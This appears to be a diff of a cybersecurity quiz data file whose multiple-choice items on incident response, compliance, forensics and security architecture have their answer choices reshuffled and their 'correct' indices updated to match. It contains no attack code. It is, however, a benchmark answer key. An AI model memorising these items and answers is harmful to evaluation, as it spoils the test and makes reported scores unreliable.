     "question": "Mean Time to Detect (MTTD) measures?",
     "choices": [
       "Time from compromise to detection",
-      "Time to deploy patches",
+      "Time to close ticket",
       "Time to restore service",
-      "Time to close ticket"
+      "Time to deploy patches"
     ],
     "correct": 0,
     "difficulty": 2
@@ -1265,12 +1265,12 @@
     "dimension": "IR",
     "question": "What is a playbook in IR?",
     "choices": [
-      "Predefined response procedures",
       "Attack documentation",
+      "Training material",
       "Security policy",
-      "Training material"
+      "Predefined response procedures"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -1278,12 +1278,12 @@
     "dimension": "IR",
     "question": "Indicators of compromise include?",
     "choices": [
-      "Unusual outbound traffic, unknown processes",
-      "High CPU usage only",
       "Slow network only",
-      "User complaints only"
+      "Unusual outbound traffic, unknown processes",
+      "User complaints only",
+      "High CPU usage only"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1291,12 +1291,12 @@
     "dimension": "IR",
     "question": "What is triage in IR?",
     "choices": [
-      "Prioritizing incidents by severity",
+      "Writing reports",
       "Collecting evidence",
       "Notifying law enforcement",
-      "Writing reports"
+      "Prioritizing incidents by severity"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1304,12 +1304,12 @@
     "dimension": "IR",
     "question": "What does EDR provide?",
     "choices": [
-      "Endpoint detection and response",
+      "Event-driven routing",
       "Email data recovery",
-      "Enterprise directory replication",
-      "Event-driven routing"
+      "Endpoint detection and response",
+      "Enterprise directory replication"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1317,12 +1317,12 @@
     "dimension": "IR",
     "question": "Live forensics differs from dead-box by?",
     "choices": [
-      "Analyzing running system",
       "Using different tools",
+      "Requiring more storage",
       "Being less accurate",
-      "Requiring more storage"
+      "Analyzing running system"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1330,12 +1330,12 @@
     "dimension": "IR",
     "question": "What is an IR retainer?",
     "choices": [
-      "Pre-arranged IR service agreement",
-      "Evidence storage device",
       "Backup system",
-      "Insurance policy"
+      "Pre-arranged IR service agreement",
+      "Insurance policy",
+      "Evidence storage device"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -1343,12 +1343,12 @@
     "dimension": "IR",
     "question": "After containment, next step is?",
     "choices": [
+      "Reporting",
       "Eradication",
       "Recovery",
-      "Reporting",
       "Lessons learned"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -1356,12 +1356,12 @@
     "dimension": "IR",
     "question": "What is lateral movement in IR context?",
     "choices": [
-      "Attacker moving between systems",
+      "Log rotation",
       "Shifting IR team members",
       "Network traffic redirection",
-      "Log rotation"
+      "Attacker moving between systems"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1369,12 +1369,12 @@
     "dimension": "IR",
     "question": "What is the purpose of write-blockers?",
     "choices": [
+      "Control write permissions",
       "Prevent evidence modification",
-      "Block malware writes",
       "Limit disk usage",
-      "Control write permissions"
+      "Block malware writes"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1382,12 +1382,12 @@
     "dimension": "IR",
     "question": "SOAR platforms provide?",
     "choices": [
-      "Security orchestration, automation, response",
-      "System operations and recovery",
       "Source of all records",
-      "Secure online access repository"
+      "Secure online access repository",
+      "System operations and recovery",
+      "Security orchestration, automation, response"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1395,12 +1395,12 @@
     "dimension": "IR",
     "question": "What is a rootkit?",
     "choices": [
+      "System administration tools",
       "Software hiding attacker presence",
       "Root user toolkit",
-      "System administration tools",
       "Kernel debugging suite"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1408,12 +1408,12 @@
     "dimension": "IR",
     "question": "Timeline analysis in IR helps?",
     "choices": [
-      "Reconstruct sequence of events",
       "Predict future attacks",
-      "Estimate damage costs",
-      "Plan staffing"
+      "Reconstruct sequence of events",
+      "Plan staffing",
+      "Estimate damage costs"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1421,12 +1421,12 @@
     "dimension": "IR",
     "question": "What is threat containment network segmentation?",
     "choices": [
-      "Isolating compromised segments",
       "Organizing network by function",
-      "Improving network speed",
-      "Reducing cable runs"
+      "Isolating compromised segments",
+      "Reducing cable runs",
+      "Improving network speed"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1434,12 +1434,12 @@
     "dimension": "IR",
     "question": "Data exfiltration detection monitors?",
     "choices": [
-      "Unusual outbound data volumes",
       "Inbound attack traffic",
-      "System performance",
-      "User logins"
+      "Unusual outbound data volumes",
+      "User logins",
+      "System performance"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1447,12 +1447,12 @@
     "dimension": "IR",
     "question": "What is a war room in IR?",
     "choices": [
+      "Training facility",
       "Dedicated space for incident coordination",
-      "Penetration testing lab",
       "Server room",
-      "Training facility"
+      "Penetration testing lab"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1460,12 +1460,12 @@
     "dimension": "IR",
     "question": "Post-incident review purpose?",
     "choices": [
-      "Improve future response",
       "Assign blame",
       "Calculate damages",
-      "Update insurance"
+      "Update insurance",
+      "Improve future response"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -1473,12 +1473,12 @@
     "dimension": "IR",
     "question": "What is dwell time?",
     "choices": [
-      "Duration attacker is undetected",
-      "Server uptime",
+      "Patch deployment time",
       "Backup retention period",
-      "Patch deployment time"
+      "Server uptime",
+      "Duration attacker is undetected"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -1499,12 +1499,12 @@
     "dimension": "IR",
     "question": "What is threat intelligence sharing during IR?",
     "choices": [
-      "Exchanging IOCs with trusted parties",
-      "Publishing on social media",
       "Selling data to competitors",
+      "Publishing on social media",
+      "Exchanging IOCs with trusted parties",
       "Broadcasting on news"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1513,9 +1513,9 @@
     "question": "What is credential harvesting detection?",
     "choices": [
       "Monitoring for mass authentication failures",
+      "Scanning for keyloggers only",
       "Checking password strength",
-      "Reviewing access logs only",
-      "Scanning for keyloggers only"
+      "Reviewing access logs only"
     ],
     "correct": 0,
     "difficulty": 3
@@ -1525,12 +1525,12 @@
     "dimension": "IR",
     "question": "Business impact analysis in IR determines?",
     "choices": [
-      "Critical assets and acceptable downtime",
-      "Marketing impact",
       "Revenue forecast",
-      "Hiring needs"
+      "Marketing impact",
+      "Hiring needs",
+      "Critical assets and acceptable downtime"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -1538,12 +1538,12 @@
     "dimension": "IR",
     "question": "What is artifact collection in digital forensics?",
     "choices": [
-      "Gathering files, logs, memory for analysis",
       "Collecting physical evidence",
+      "Gathering files, logs, memory for analysis",
       "Taking photos",
       "Interviewing witnesses"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1552,8 +1552,8 @@
     "question": "MITRE ATT&CK in IR helps?",
     "choices": [
       "Mapping observed TTPs to known techniques",
-      "Automatically blocking attacks",
       "Generating firewall rules",
+      "Automatically blocking attacks",
       "Creating user accounts"
     ],
     "correct": 0,
@@ -1564,12 +1564,12 @@
     "dimension": "CG",
     "question": "GDPR applies to?",
     "choices": [
-      "EU personal data processing",
+      "Government agencies only",
       "US financial institutions",
       "Healthcare only",
-      "Government agencies only"
+      "EU personal data processing"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -1578,8 +1578,8 @@
     "question": "PCI-DSS protects?",
     "choices": [
       "Payment card data",
-      "Personal health info",
       "Classified documents",
+      "Personal health info",
       "Intellectual property"
     ],
     "correct": 0,
@@ -1590,12 +1590,12 @@
     "dimension": "CG",
     "question": "SOC 2 Type II differs from Type I by?",
     "choices": [
-      "Testing controls over time period",
-      "Having more controls",
       "Being more expensive",
-      "Requiring certification"
+      "Having more controls",
+      "Requiring certification",
+      "Testing controls over time period"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -1603,12 +1603,12 @@
     "dimension": "CG",
     "question": "What is the right to erasure under GDPR?",
     "choices": [
-      "Right to have personal data deleted",
-      "Right to erase malware",
+      "Right to clear browser history",
       "Right to delete account",
-      "Right to clear browser history"
+      "Right to have personal data deleted",
+      "Right to erase malware"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1616,12 +1616,12 @@
     "dimension": "CG",
     "question": "HIPAA protects?",
     "choices": [
+      "Intellectual property",
       "Protected Health Information",
       "Financial records",
-      "Government secrets",
-      "Intellectual property"
+      "Government secrets"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -1642,12 +1642,12 @@
     "dimension": "CG",
     "question": "ISO 27001 is?",
     "choices": [
-      "Information security management standard",
       "Network protocol",
       "Encryption algorithm",
-      "Programming language"
+      "Programming language",
+      "Information security management standard"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -1655,12 +1655,12 @@
     "dimension": "CG",
     "question": "What is the NIST Cybersecurity Framework?",
     "choices": [
-      "Voluntary framework for managing cyber risk",
       "Mandatory federal standard",
+      "Network protocol",
       "Encryption standard",
-      "Network protocol"
+      "Voluntary framework for managing cyber risk"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1668,12 +1668,12 @@
     "dimension": "CG",
     "question": "Data breach notification under GDPR must be within?",
     "choices": [
-      "72 hours",
+      "30 days",
       "24 hours",
       "7 days",
-      "30 days"
+      "72 hours"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1681,12 +1681,12 @@
     "dimension": "CG",
     "question": "What is separation of duties?",
     "choices": [
-      "No single person controls entire process",
-      "Physical workspace separation",
       "Network segmentation",
-      "Code separation"
+      "No single person controls entire process",
+      "Code separation",
+      "Physical workspace separation"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1694,12 +1694,12 @@
     "dimension": "CG",
     "question": "CCPA applies to?",
     "choices": [
-      "California consumer data",
       "Canadian corporations",
       "Chinese computing",
-      "Central cybersecurity"
+      "Central cybersecurity",
+      "California consumer data"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1707,12 +1707,12 @@
     "dimension": "CG",
     "question": "What is a risk register?",
     "choices": [
-      "Document tracking identified risks",
       "Registry of risky users",
       "Malware signature database",
-      "Incident log"
+      "Incident log",
+      "Document tracking identified risks"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1720,12 +1720,12 @@
     "dimension": "CG",
     "question": "SOX compliance requires?",
     "choices": [
-      "Internal controls over financial reporting",
       "Security testing",
+      "Internal controls over financial reporting",
       "Penetration testing",
       "Code reviews"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -1733,12 +1733,12 @@
     "dimension": "CG",
     "question": "What is a control framework?",
     "choices": [
-      "Structured set of security controls",
       "Remote control system",
+      "Structured set of security controls",
       "Change control process",
       "Quality control tools"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1746,12 +1746,12 @@
     "dimension": "CG",
     "question": "FISMA applies to?",
     "choices": [
-      "US federal agencies",
       "Financial institutions",
+      "US federal agencies",
       "Healthcare organizations",
       "All private companies"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1759,12 +1759,12 @@
     "dimension": "CG",
     "question": "What is residual risk?",
     "choices": [
-      "Risk remaining after controls",
-      "Initial risk assessment",
       "Maximum possible risk",
-      "Acceptable risk level"
+      "Initial risk assessment",
+      "Acceptable risk level",
+      "Risk remaining after controls"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1772,12 +1772,12 @@
     "dimension": "CG",
     "question": "Privacy by design means?",
     "choices": [
-      "Building privacy into systems from start",
       "Designing private networks",
+      "Encrypting all data",
       "Using VPNs by default",
-      "Encrypting all data"
+      "Building privacy into systems from start"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1785,12 +1785,12 @@
     "dimension": "CG",
     "question": "What is a third-party risk assessment?",
     "choices": [
-      "Evaluating vendor security posture",
+      "Reviewing resumes",
       "Testing third-party software",
       "Auditing contractor work",
-      "Reviewing resumes"
+      "Evaluating vendor security posture"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1799,9 +1799,9 @@
     "question": "NIST 800-53 provides?",
     "choices": [
       "Security and privacy controls catalog",
+      "Programming standards",
       "Encryption algorithms",
-      "Network protocols",
-      "Programming standards"
+      "Network protocols"
     ],
     "correct": 0,
     "difficulty": 2
@@ -1812,9 +1812,9 @@
     "question": "What is data classification?",
     "choices": [
       "Categorizing data by sensitivity level",
-      "Sorting data alphabetically",
       "Compressing data",
-      "Archiving old data"
+      "Archiving old data",
+      "Sorting data alphabetically"
     ],
     "correct": 0,
     "difficulty": 1
@@ -1825,8 +1825,8 @@
     "question": "Access control principle 'need-to-know' means?",
     "choices": [
       "Access only to required information",
-      "Everyone needs full access",
       "Knowledge sharing is mandatory",
+      "Everyone needs full access",
       "Training requirement"
     ],
     "correct": 0,
@@ -1837,12 +1837,12 @@
     "dimension": "CG",
     "question": "What is an audit trail?",
     "choices": [
-      "Chronological record of system activities",
-      "Physical inspection path",
+      "Code review history",
       "Network route trace",
-      "Code review history"
+      "Chronological record of system activities",
+      "Physical inspection path"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -1850,12 +1850,12 @@
     "dimension": "CG",
     "question": "CMMC is for?",
     "choices": [
-      "Defense contractor cybersecurity",
-      "Cloud migration",
+      "Content moderation",
       "Code management",
-      "Content moderation"
+      "Defense contractor cybersecurity",
+      "Cloud migration"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -1863,12 +1863,12 @@
     "dimension": "CG",
     "question": "What is inherent risk?",
     "choices": [
-      "Risk before any controls applied",
       "Risk that cannot be mitigated",
-      "Risk from internal actors",
-      "Risk from natural disasters"
+      "Risk from natural disasters",
+      "Risk before any controls applied",
+      "Risk from internal actors"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -1876,12 +1876,12 @@
     "dimension": "CG",
     "question": "Data sovereignty means?",
     "choices": [
-      "Data subject to laws of its location",
       "Data owned by sovereign nation",
-      "Government control of internet",
-      "International data sharing"
+      "International data sharing",
+      "Data subject to laws of its location",
+      "Government control of internet"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -1889,12 +1889,12 @@
     "dimension": "CG",
     "question": "What is a business continuity plan?",
     "choices": [
+      "HR recruitment plan",
       "Procedures to maintain operations during disruption",
       "Marketing strategy",
-      "HR recruitment plan",
       "Budget proposal"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1902,12 +1902,12 @@
     "dimension": "CG",
     "question": "FedRAMP is?",
     "choices": [
-      "US government cloud security program",
+      "Radio frequency standard",
       "Federal ransomware prevention",
       "Network authentication protocol",
-      "Radio frequency standard"
+      "US government cloud security program"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -1916,9 +1916,9 @@
     "question": "What is quantitative risk analysis?",
     "choices": [
       "Assigning monetary values to risks",
-      "Counting vulnerabilities",
+      "Measuring network speed",
       "Rating risks as high/medium/low",
-      "Measuring network speed"
+      "Counting vulnerabilities"
     ],
     "correct": 0,
     "difficulty": 3
@@ -1929,9 +1929,9 @@
     "question": "GDPR data controller vs processor?",
     "choices": [
       "Controller decides purpose, processor handles data",
-      "No difference",
       "Controller is always larger org",
-      "Processor is always third party"
+      "Processor is always third party",
+      "No difference"
     ],
     "correct": 0,
     "difficulty": 3
@@ -1941,12 +1941,12 @@
     "dimension": "CG",
     "question": "What is CIS benchmarks?",
     "choices": [
-      "Secure configuration guidelines",
       "Internet speed standards",
-      "Coding style guides",
-      "Database schemas"
+      "Database schemas",
+      "Secure configuration guidelines",
+      "Coding style guides"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1954,12 +1954,12 @@
     "dimension": "FA",
     "question": "What is digital forensics?",
     "choices": [
-      "Investigation of digital evidence",
       "Digital photography",
       "Online fraud detection",
+      "Investigation of digital evidence",
       "Computer repair"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -1967,12 +1967,12 @@
     "dimension": "FA",
     "question": "First rule of digital evidence handling?",
     "choices": [
+      "Reboot the system",
       "Preserve and don't modify",
       "Copy everything quickly",
-      "Delete suspicious files",
-      "Reboot the system"
+      "Delete suspicious files"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -1980,12 +1980,12 @@
     "dimension": "FA",
     "question": "What is a forensic image?",
     "choices": [
-      "Bit-for-bit copy of storage",
       "Photo of the crime scene",
       "Screenshot of desktop",
+      "Bit-for-bit copy of storage",
       "System configuration backup"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -1993,12 +1993,12 @@
     "dimension": "FA",
     "question": "File carving recovers files by?",
     "choices": [
-      "Identifying file headers/footers in raw data",
-      "Searching file names",
       "Checking recycle bin",
-      "Reading file system tables"
+      "Reading file system tables",
+      "Identifying file headers/footers in raw data",
+      "Searching file names"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -2007,9 +2007,9 @@
     "question": "What is steganography in forensics?",
     "choices": [
       "Data hidden within other data",
-      "Encrypted communication",
       "Compressed archives",
-      "Encoded messages"
+      "Encoded messages",
+      "Encrypted communication"
     ],
     "correct": 0,
     "difficulty": 2
@@ -2019,12 +2019,12 @@
     "dimension": "FA",
     "question": "NTFS $MFT contains?",
     "choices": [
-      "Master File Table with file metadata",
-      "Malware File Tracking data",
+      "Modified File Timestamps",
       "Network Firewall Tables",
-      "Modified File Timestamps"
+      "Malware File Tracking data",
+      "Master File Table with file metadata"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2032,12 +2032,12 @@
     "dimension": "FA",
     "question": "What is registry forensics?",
     "choices": [
+      "Database query logging",
       "Analyzing Windows registry for evidence",
       "Checking domain registrations",
-      "Verifying SSL certificates",
-      "Database query logging"
+      "Verifying SSL certificates"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2045,12 +2045,12 @@
     "dimension": "FA",
     "question": "Autopsy is?",
     "choices": [
-      "Open-source digital forensics platform",
       "Medical examination tool",
       "Code analysis framework",
-      "Network monitoring tool"
+      "Network monitoring tool",
+      "Open-source digital forensics platform"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2059,9 +2059,9 @@
     "question": "What is anti-forensics?",
     "choices": [
       "Techniques to hinder investigation",
-      "Automated forensic tools",
+      "Security awareness training",
       "Preventing data breaches",
-      "Security awareness training"
+      "Automated forensic tools"
     ],
     "correct": 0,
     "difficulty": 2
@@ -2071,12 +2071,12 @@
     "dimension": "FA",
     "question": "Network forensics primarily analyzes?",
     "choices": [
-      "Captured network traffic",
+      "IP addresses only",
       "Network cables",
       "Router hardware",
-      "IP addresses only"
+      "Captured network traffic"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2084,12 +2084,12 @@
     "dimension": "FA",
     "question": "What is timeline analysis?",
     "choices": [
-      "Chronological ordering of events",
-      "Project planning",
+      "Capacity planning",
       "Performance benchmarking",
-      "Capacity planning"
+      "Project planning",
+      "Chronological ordering of events"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2097,12 +2097,12 @@
     "dimension": "FA",
     "question": "Memory forensics can reveal?",
     "choices": [
-      "Running processes, encryption keys, network connections",
-      "Disk contents only",
       "Future attacks",
-      "Physical location"
+      "Physical location",
+      "Running processes, encryption keys, network connections",
+      "Disk contents only"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2110,12 +2110,12 @@
     "dimension": "FA",
     "question": "What is slack space?",
     "choices": [
-      "Unused space in allocated clusters",
-      "Network bandwidth waste",
+      "Idle CPU time",
       "Unallocated disk partitions",
-      "Idle CPU time"
+      "Network bandwidth waste",
+      "Unused space in allocated clusters"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2124,9 +2124,9 @@
     "question": "EnCase is used for?",
     "choices": [
       "Forensic investigation and analysis",
+      "Database management",
       "Network monitoring",
-      "Code compilation",
-      "Database management"
+      "Code compilation"
     ],
     "correct": 0,
     "difficulty": 2
@@ -2136,12 +2136,12 @@
     "dimension": "FA",
     "question": "What is a hash value in forensics?",
     "choices": [
-      "Digital fingerprint to verify integrity",
       "Password storage method",
-      "Encryption key",
-      "File compression code"
+      "File compression code",
+      "Digital fingerprint to verify integrity",
+      "Encryption key"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2149,12 +2149,12 @@
     "dimension": "FA",
     "question": "Browser forensics examines?",
     "choices": [
-      "History, cookies, cache, bookmarks",
       "Browser source code",
       "Network bandwidth",
+      "History, cookies, cache, bookmarks",
       "Server logs only"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2162,12 +2162,12 @@
     "dimension": "FA",
     "question": "What is volatile evidence?",
     "choices": [
+      "Unreliable evidence",
       "Data lost when power off (RAM, processes)",
       "Easily tampered evidence",
-      "Unreliable evidence",
       "Temporary files"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2175,12 +2175,12 @@
     "dimension": "FA",
     "question": "Log analysis in forensics looks for?",
     "choices": [
-      "Anomalous events and patterns",
       "Formatting errors",
+      "Anomalous events and patterns",
       "Disk usage stats",
       "Software updates"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2188,12 +2188,12 @@
     "dimension": "FA",
     "question": "What is email forensics?",
     "choices": [
-      "Analyzing email headers, content, attachments",
       "Email marketing analytics",
+      "Email server administration",
       "Spam filtering",
-      "Email server administration"
+      "Analyzing email headers, content, attachments"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2201,12 +2201,12 @@
     "dimension": "FA",
     "question": "Mobile forensics challenges include?",
     "choices": [
-      "Encryption, variety of OS/hardware, cloud sync",
-      "Small screen size",
       "Battery life",
-      "Touch interface"
+      "Small screen size",
+      "Touch interface",
+      "Encryption, variety of OS/hardware, cloud sync"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2214,12 +2214,12 @@
     "dimension": "FA",
     "question": "What is data recovery?",
     "choices": [
-      "Retrieving lost or deleted data",
-      "Data backup process",
+      "Data migration",
       "Data encryption",
-      "Data migration"
+      "Data backup process",
+      "Retrieving lost or deleted data"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -2227,12 +2227,12 @@
     "dimension": "FA",
     "question": "PCAP files contain?",
     "choices": [
-      "Captured network packets",
-      "Password captures",
       "Program counter logs",
+      "Password captures",
+      "Captured network packets",
       "Process CPU allocation"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2241,9 +2241,9 @@
     "question": "What is malware forensics?",
     "choices": [
       "Analyzing malicious software behavior",
-      "Writing malware",
+      "Selling malware",
       "Distributing malware",
-      "Selling malware"
+      "Writing malware"
     ],
     "correct": 0,
     "difficulty": 1
@@ -2253,12 +2253,12 @@
     "dimension": "FA",
     "question": "Cloud forensics challenges include?",
     "choices": [
-      "Multi-tenancy, jurisdiction, data volatility",
       "High costs only",
+      "Multi-tenancy, jurisdiction, data volatility",
       "Slow speeds only",
       "Limited storage only"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -2266,12 +2266,12 @@
     "dimension": "FA",
     "question": "What does EnCase's E01 format provide?",
     "choices": [
-      "Compressed forensic image with verification",
-      "Executable file format",
       "Email archive format",
+      "Executable file format",
+      "Compressed forensic image with verification",
       "Encrypted document format"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -2279,12 +2279,12 @@
     "dimension": "FA",
     "question": "What is prefetch file analysis?",
     "choices": [
-      "Tracking application execution history",
-      "Monitoring network prefetching",
       "Analyzing DNS prefetch",
+      "Monitoring network prefetching",
+      "Tracking application execution history",
       "Browser preloading analysis"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -2292,12 +2292,12 @@
     "dimension": "FA",
     "question": "Plaso/log2timeline creates?",
     "choices": [
-      "Super timeline from multiple sources",
       "System performance logs",
       "Backup schedules",
+      "Super timeline from multiple sources",
       "Network topology maps"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -2305,12 +2305,12 @@
     "dimension": "FA",
     "question": "What is a forensic workstation?",
     "choices": [
-      "Isolated system for evidence analysis",
       "Regular desktop computer",
       "Server for forensic database",
+      "Isolated system for evidence analysis",
       "Network appliance"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2318,12 +2318,12 @@
     "dimension": "FA",
     "question": "What does FTK Imager do?",
     "choices": [
-      "Creates forensic disk images",
       "Tracks file transfers",
+      "Fixes kernel bugs",
       "Tests firewall rules",
-      "Fixes kernel bugs"
+      "Creates forensic disk images"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2344,12 +2344,12 @@
     "dimension": "SA",
     "question": "What is zero trust architecture?",
     "choices": [
-      "Never trust, always verify",
       "Trust internal network fully",
+      "Never trust, always verify",
       "Trust verified users permanently",
       "Zero security controls needed"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2357,12 +2357,12 @@
     "dimension": "SA",
     "question": "Defense in depth uses?",
     "choices": [
-      "Multiple layers of security",
-      "Single strong firewall",
       "Strongest encryption only",
+      "Single strong firewall",
+      "Multiple layers of security",
       "Air-gapped networks only"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -2383,12 +2383,12 @@
     "dimension": "SA",
     "question": "Microsegmentation provides?",
     "choices": [
-      "Granular network isolation",
       "Small network subnets",
+      "Minimal security controls",
       "Microservice deployment",
-      "Minimal security controls"
+      "Granular network isolation"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2396,12 +2396,12 @@
     "dimension": "SA",
     "question": "SASE combines?",
     "choices": [
-      "Network and security as cloud service",
+      "Security and scalability",
       "Server and storage",
       "Software and services",
-      "Security and scalability"
+      "Network and security as cloud service"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2409,12 +2409,12 @@
     "dimension": "SA",
     "question": "What is PKI?",
     "choices": [
-      "Public Key Infrastructure",
-      "Private Key Index",
+      "Primary Knowledge Interface",
       "Protocol Key Interchange",
-      "Primary Knowledge Interface"
+      "Public Key Infrastructure",
+      "Private Key Index"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2422,12 +2422,12 @@
     "dimension": "SA",
     "question": "NAC stands for?",
     "choices": [
-      "Network Access Control",
-      "Network Authentication Center",
       "National Access Code",
-      "Node Administration Console"
+      "Node Administration Console",
+      "Network Authentication Center",
+      "Network Access Control"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2435,12 +2435,12 @@
     "dimension": "SA",
     "question": "What does a WAF protect?",
     "choices": [
+      "Wide area networks",
       "Web applications from HTTP attacks",
       "Wireless networks",
-      "Wide area networks",
       "Windows applications"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2448,12 +2448,12 @@
     "dimension": "SA",
     "question": "What is network segmentation?",
     "choices": [
-      "Dividing network into isolated zones",
       "Physical network cabling",
       "Network speed optimization",
+      "Dividing network into isolated zones",
       "Network monitoring"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -2463,8 +2463,8 @@
     "choices": [
       "Mutual authentication between client and server",
       "Multiple TLS connections",
-      "Mobile TLS",
-      "Managed TLS"
+      "Managed TLS",
+      "Mobile TLS"
     ],
     "correct": 0,
     "difficulty": 3
@@ -2474,12 +2474,12 @@
     "dimension": "SA",
     "question": "What is a security reference architecture?",
     "choices": [
-      "Blueprint for implementing security controls",
-      "Reference manual for security terms",
+      "Directory of security vendors",
       "Database of security tools",
-      "Directory of security vendors"
+      "Blueprint for implementing security controls",
+      "Reference manual for security terms"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2487,12 +2487,12 @@
     "dimension": "SA",
     "question": "CASB is used for?",
     "choices": [
-      "Cloud access security brokering",
       "Certificate authority services",
       "Centralized authentication",
-      "Content access streaming"
+      "Content access streaming",
+      "Cloud access security brokering"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2500,12 +2500,12 @@
